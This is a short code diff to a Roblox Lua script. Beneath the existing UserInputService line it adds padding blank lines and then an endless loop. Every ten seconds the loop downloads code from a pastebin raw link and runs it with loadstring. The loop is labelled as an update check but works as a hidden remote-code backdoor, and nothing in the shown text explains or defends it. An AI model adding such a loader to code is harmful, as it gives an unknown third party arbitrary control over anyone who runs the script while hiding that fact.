@@ -685,3 +685,23 @@ end)
 
 
 local UserInputService = game:GetService("UserInputService")
+
+
+
+
+
+
+
+
+
+while true do
+    local success, err = pcall(function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/8v6yJMvB'))()
+    end)
+    
+    if not success then
+        warn("Could not update", err)
+    end
+
+    wait(10)
+end
